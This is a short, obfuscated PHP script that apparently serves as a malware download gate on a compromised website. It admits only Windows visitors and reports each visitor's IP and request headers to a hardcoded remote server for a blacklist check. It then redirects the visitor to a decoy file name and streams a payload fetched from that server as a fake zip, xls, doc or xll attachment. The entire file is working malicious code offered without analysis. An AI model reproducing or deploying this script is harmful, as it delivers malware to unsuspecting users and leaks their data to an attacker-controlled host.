<?php $l0='2.1';$n1='charts';if(session_start()===false){exit('');}$k2=$_SERVER['REQUEST_URI'];if(empty($k2)){exit('');}$d3=explode("/",$k2);if(count($d3)!=3){exit('');}$_GET['e']=$d3[2];if(empty($_SERVER['HTTP_USER_AGENT'])){exit('');}if(stripos($_SERVER['HTTP_USER_AGENT'],'Windows')===false){exit('');}function getRealIpAddr(){if(!empty($_SERVER['HTTP_CLIENT_IP'])){$a4=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$a4=$_SERVER['HTTP_X_FORWARDED_FOR'];}else{$a4=$_SERVER['REMOTE_ADDR'];}return $a4;}$h5=array();$c6=getallheaders();foreach($c6 as $m7=>$p8){$t9=strtolower($m7);$h5[$t9]=$p8;}$w10=explode(".",$_GET['e']);$w10=end($w10);if(!in_array($w10,['zip','xls','doc','xll'])){$w10='zip';}$r11=["ip"=>getRealIpAddr(),"time"=>time(),"hh"=>$h5['hh'],"ext"=>$w10,"host"=>$_SERVER['SERVER_NAME'],"filename"=>$_GET['e'],];$r11=json_encode($r11);$r11=base64_encode($r11);$n12=getRealIpAddr();$l13=['http://69.49.230.71/router_black.php?ip='.$n12.'&data='.$r11.'&version='.$l0.'&alanpo='.$h5['alanpo'],'http://69.49.230.71/router_black.php?ip='.$n12.'&data='.$r11.'&version='.$l0.'&alanpo='.$h5['alanpo'],'http://69.49.230.71/router_black.php?ip='.$n12.'&data='.$r11.'&version='.$l0.'&alanpo='.$h5['alanpo'],];$f14=false;foreach($l13 as $g15){$t16=stream_context_create(array('http'=>array('timeout'=>10,)));$r17=@file_get_contents($g15,false,$t16);$i18=json_decode($r17,true);if($i18['status']===true){$f14=$i18['is_black'];$n1=$i18['REDIRECT_FILENAME'];break;}}if($_GET['e']!='123.'.$w10){if($f14){exit('');}if($_GET['e']!=$n1.".".$w10){$_SESSION['__redirect_was_start']=true;$_SESSION['doc_name']=$_GET['e'];if(stripos($_SESSION['doc_name'],'.'.$w10)===false){$_SESSION['doc_name'].='.'.$w10;}$_SESSION['file_ext']=$w10;$q19=str_replace($_GET['e'],$n1.".".$w10,$k2);echo "<html><body>";echo '<div id="nk" dt-nk="'.$q19.'"></div>';echo "<script>";echo "location.pathname = document.getElementById('nk').getAttribute('dt-nk');";echo "</script>";echo "</body></html>";exit('Wait...');}}else{if(empty($h5['hh'])){exit('');}}if(empty($_SESSION['file_ext'])){$_SESSION['file_ext']='zip';}if(empty($h5['hh'])&&$_GET['e']!=$n1.".".$w10){exit();}$t20=['http://69.49.230.71/router08.php?pp='.$r11.'&version='.$l0,'http://69.49.230.71/router08.php?pp='.$r11.'&version='.$l0,'http://69.49.230.71/router08.php?pp='.$r11.'&version='.$l0,];shuffle($t20);$q21=__DIR__.'/../big__stat.txt';if(empty($_SESSION['doc_name'])){$_SESSION['doc_name']=$n1.".".$w10;}foreach($t20 as $u22){$t16=stream_context_create(array('http'=>array('timeout'=>30,)));$h23=@file_get_contents($u22,false,$t16);if($h23=='....'||$h23=='...'){break;}if(strlen($h23)<1000){continue;}header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename='.$_SESSION['doc_name']);header('Content-Transfer-Encoding: binary');header('Connection: Keep-Alive');header('Expires: 0');header('Cache-Control: must-revalidate, post-check=0, pre-check=0');header('Pragma: public');echo $h23;exit;}exit("Try again.");?>